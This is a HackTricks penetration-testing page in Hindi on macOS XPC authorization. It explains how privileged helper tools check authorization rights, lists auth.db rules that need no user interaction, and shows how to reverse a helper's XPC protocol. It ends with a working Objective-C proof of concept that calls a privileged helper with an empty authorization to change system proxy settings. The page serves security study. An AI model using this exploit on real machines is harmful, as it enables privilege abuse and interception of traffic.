# macOS XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Apple एक और तरीका प्रस्तावित करता है यह सत्यापित करने के लिए कि क्या कनेक्टिंग प्रक्रिया के पास **एक एक्सपोज़्ड XPC मेथड को कॉल करने की अनुमति है**।

जब एक एप्लिकेशन को **एक विशेषाधिकार प्राप्त उपयोगकर्ता के रूप में क्रियाएँ निष्पादित करने की आवश्यकता होती है**, तो यह आमतौर पर विशेषाधिकार प्राप्त उपयोगकर्ता के रूप में एप्लिकेशन चलाने के बजाय एक HelperTool को रूट के रूप में एक XPC सेवा के रूप में स्थापित करता है जिसे एप्लिकेशन से उन क्रियाओं को करने के लिए कॉल किया जा सकता है। हालाँकि, सेवा को कॉल करने वाले एप्लिकेशन के पास पर्याप्त प्राधिकरण होना चाहिए।

### ShouldAcceptNewConnection हमेशा YES

एक उदाहरण [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample) में पाया जा सकता है। `App/AppDelegate.m` में यह **HelperTool** से **कनेक्ट** करने की कोशिश करता है। और `HelperTool/HelperTool.m` में फ़ंक्शन **`shouldAcceptNewConnection`** **कोई भी** पूर्व में निर्दिष्ट आवश्यकताओं की जांच **नहीं करेगा**। यह हमेशा YES लौटाएगा:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
अधिक जानकारी के लिए कि इस जांच को सही तरीके से कैसे कॉन्फ़िगर करें:

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### एप्लिकेशन अधिकार

हालांकि, जब HelperTool से एक विधि को कॉल किया जाता है, तो कुछ **अधिकार प्राप्त हो रहे हैं**।

`App/AppDelegate.m` से **`applicationDidFinishLaunching`** फ़ंक्शन ऐप के शुरू होने के बाद एक खाली अधिकार संदर्भ बनाएगा। यह हमेशा काम करना चाहिए।\
फिर, यह उस अधिकार संदर्भ में **कुछ अधिकार जोड़ने** की कोशिश करेगा `setupAuthorizationRights` को कॉल करके:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
फंक्शन `setupAuthorizationRights` से `Common/Common.m` ऑथ डेटाबेस `/var/db/auth.db` में एप्लिकेशन के अधिकारों को स्टोर करेगा। ध्यान दें कि यह केवल उन अधिकारों को जोड़ेगा जो अभी तक डेटाबेस में नहीं हैं:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
फंक्शन `enumerateRightsUsingBlock` वह है जिसका उपयोग एप्लिकेशनों की अनुमतियों को प्राप्त करने के लिए किया जाता है, जो `commandInfo` में परिभाषित हैं:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
इसका मतलब है कि इस प्रक्रिया के अंत में, `commandInfo` के अंदर घोषित अनुमतियाँ `/var/db/auth.db` में संग्रहीत की जाएँगी। ध्यान दें कि वहाँ आप **प्रत्येक विधि** के लिए पा सकते हैं जो **प्रमाणीकरण** की आवश्यकता होगी, **अनुमति नाम** और **`kCommandKeyAuthRightDefault`**। बाद वाला **यह संकेत करता है कि इसे कौन प्राप्त कर सकता है**।

किसी अधिकार तक पहुँचने के लिए विभिन्न दायरे हैं। इनमें से कुछ को [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) में परिभाषित किया गया है (आप [यहाँ सभी पा सकते हैं](https://www.dssw.co.uk/reference/authorization-rights/)), लेकिन संक्षेप में:

<table><thead><tr><th width="284.3333333333333">नाम</th><th width="165">मान</th><th>विवरण</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>कोई भी</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>कोई नहीं</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>वर्तमान उपयोगकर्ता को एक व्यवस्थापक होना चाहिए (व्यवस्थापक समूह के अंदर)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>उपयोगकर्ता से प्रमाणीकरण करने के लिए कहें।</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>उपयोगकर्ता से प्रमाणीकरण करने के लिए कहें। उसे एक व्यवस्थापक होना चाहिए (व्यवस्थापक समूह के अंदर)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>नियम निर्दिष्ट करें</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>अधिकार पर कुछ अतिरिक्त टिप्पणियाँ निर्दिष्ट करें</td></tr></tbody></table>

### अधिकारों की सत्यापन

`HelperTool/HelperTool.m` में फ़ंक्शन **`readLicenseKeyAuthorization`** यह जांचता है कि क्या कॉलर को **ऐसी विधि** को **निष्पादित** करने के लिए अधिकृत किया गया है, फ़ंक्शन **`checkAuthorization`** को कॉल करके। यह फ़ंक्शन यह जांचेगा कि कॉलिंग प्रक्रिया द्वारा भेजा गया **authData** **सही प्रारूप** में है और फिर यह जांचेगा कि विशेष विधि को कॉल करने के लिए **क्या आवश्यक है**। यदि सब कुछ ठीक है तो **वापस किया गया `error` `nil` होगा**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
ध्यान दें कि उस विधि को कॉल करने के लिए आवश्यकताओं की **जांच करने के लिए** फ़ंक्शन `authorizationRightForCommand` केवल पूर्व में टिप्पणी किए गए ऑब्जेक्ट **`commandInfo`** की जांच करेगा। फिर, यह **`AuthorizationCopyRights`** को कॉल करेगा यह जांचने के लिए कि **क्या इसके पास फ़ंक्शन को कॉल करने के अधिकार हैं** (ध्यान दें कि फ्लैग उपयोगकर्ता के साथ इंटरैक्शन की अनुमति देते हैं)।

इस मामले में, फ़ंक्शन `readLicenseKeyAuthorization` को कॉल करने के लिए `kCommandKeyAuthRightDefault` को `@kAuthorizationRuleClassAllow` पर परिभाषित किया गया है। इसलिए **कोई भी इसे कॉल कर सकता है**।

### DB जानकारी

यह उल्लेख किया गया था कि यह जानकारी `/var/db/auth.db` में संग्रहीत है। आप सभी संग्रहीत नियमों को सूचीबद्ध कर सकते हैं:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
फिर, आप यह पढ़ सकते हैं कि किसे अधिकार तक पहुँचने की अनुमति है:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Permissive rights

आप **सभी अनुमतियों की कॉन्फ़िगरेशन** [**यहां**](https://www.dssw.co.uk/reference/authorization-rights/) पा सकते हैं, लेकिन संयोजन जो उपयोगकर्ता इंटरैक्शन की आवश्यकता नहीं होगी, वे होंगे:

1. **'authenticate-user': 'false'**
- यह सबसे सीधा कुंजी है। यदि इसे `false` पर सेट किया गया है, तो यह निर्दिष्ट करता है कि उपयोगकर्ता को इस अधिकार को प्राप्त करने के लिए प्रमाणीकरण प्रदान करने की आवश्यकता नहीं है।
- इसका उपयोग **नीचे दिए गए 2 में से एक के साथ या उपयोगकर्ता को संबंधित समूह को इंगित करने के लिए** किया जाता है।
2. **'allow-root': 'true'**
- यदि एक उपयोगकर्ता रूट उपयोगकर्ता के रूप में कार्य कर रहा है (जिसके पास उच्च अनुमतियाँ हैं), और यह कुंजी `true` पर सेट है, तो रूट उपयोगकर्ता संभावित रूप से बिना किसी अतिरिक्त प्रमाणीकरण के इस अधिकार को प्राप्त कर सकता है। हालाँकि, आमतौर पर, रूट उपयोगकर्ता स्थिति प्राप्त करने के लिए पहले से ही प्रमाणीकरण की आवश्यकता होती है, इसलिए यह अधिकांश उपयोगकर्ताओं के लिए "कोई प्रमाणीकरण नहीं" परिदृश्य नहीं है।
3. **'session-owner': 'true'**
- यदि इसे `true` पर सेट किया गया है, तो सत्र का मालिक (वर्तमान में लॉग इन किया हुआ उपयोगकर्ता) स्वचालित रूप से इस अधिकार को प्राप्त करेगा। यदि उपयोगकर्ता पहले से ही लॉग इन है, तो यह अतिरिक्त प्रमाणीकरण को बायपास कर सकता है।
4. **'shared': 'true'**
- यह कुंजी प्रमाणीकरण के बिना अधिकार नहीं देती है। इसके बजाय, यदि इसे `true` पर सेट किया गया है, तो इसका मतलब है कि एक बार जब अधिकार को प्रमाणीकरण किया गया है, तो इसे कई प्रक्रियाओं के बीच साझा किया जा सकता है बिना प्रत्येक को फिर से प्रमाणीकरण की आवश्यकता के। लेकिन अधिकार का प्रारंभिक अनुदान अभी भी प्रमाणीकरण की आवश्यकता होगी जब तक कि इसे अन्य कुंजियों जैसे कि `'authenticate-user': 'false'` के साथ संयोजित नहीं किया गया हो।

आप [**इस स्क्रिप्ट का उपयोग कर सकते हैं**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) दिलचस्प अधिकार प्राप्त करने के लिए:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## अधिकृतता को उलटना

### यह जांचना कि क्या EvenBetterAuthorization का उपयोग किया गया है

यदि आप फ़ंक्शन: **`[HelperTool checkAuthorization:command:]`** पाते हैं, तो यह संभवतः प्रक्रिया द्वारा पहले उल्लेखित स्कीमा का उपयोग कर रही है:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

यदि यह फ़ंक्शन `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree` जैसे फ़ंक्शंस को कॉल कर रहा है, तो यह [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154) का उपयोग कर रहा है।

यह देखने के लिए **`/var/db/auth.db`** की जांच करें कि क्या उपयोगकर्ता इंटरैक्शन के बिना कुछ विशेषाधिकार प्राप्त कार्रवाई को कॉल करने के लिए अनुमतियाँ प्राप्त करना संभव है।

### प्रोटोकॉल संचार

फिर, आपको XPC सेवा के साथ संचार स्थापित करने के लिए प्रोटोकॉल स्कीमा खोजने की आवश्यकता है।

फ़ंक्शन **`shouldAcceptNewConnection`** निर्यातित प्रोटोकॉल को इंगित करता है:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

इस मामले में, हमारे पास EvenBetterAuthorizationSample में वही है, [**इस पंक्ति की जांच करें**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94)।

उपयोग किए गए प्रोटोकॉल का नाम जानने पर, आप **इसके हेडर परिभाषा को डंप** कर सकते हैं:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
अंत में, हमें केवल **प्रकट Mach सेवा का नाम** जानने की आवश्यकता है ताकि इसके साथ संचार स्थापित किया जा सके। इसे खोजने के कई तरीके हैं:

- **`[HelperTool init]`** में जहाँ आप Mach सेवा का उपयोग होते हुए देख सकते हैं:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- launchd plist में:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Example

इस उदाहरण में बनाया गया है:

- प्रोटोकॉल की परिभाषा जिसमें कार्य शामिल हैं
- उपयोग के लिए एक खाली auth जो एक्सेस मांगने के लिए है
- XPC सेवा से एक कनेक्शन
- यदि कनेक्शन सफल था तो कार्य को कॉल करना
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## अन्य XPC विशेषाधिकार सहायक का दुरुपयोग

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## संदर्भ

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)

{{#include ../../../../../banners/hacktricks-training.md}}
